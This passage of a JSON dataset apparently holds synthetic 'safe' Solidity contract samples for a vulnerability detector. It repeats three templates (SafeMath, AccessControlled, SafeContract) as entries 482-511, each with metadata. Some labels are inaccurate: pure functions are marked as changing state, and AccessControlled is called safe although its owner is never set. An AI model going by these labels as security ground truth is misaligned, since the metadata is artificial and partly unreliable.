    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 482",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 483",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 484",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 485",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 486",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 487",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 488",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 489",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 490",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 491",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 492",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 493",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 494",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 495",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 496",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 497",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 498",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 499",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 500",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 501",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 502",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 503",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 504",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 505",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 506",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 507",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 508",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 509",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 510",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 511",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
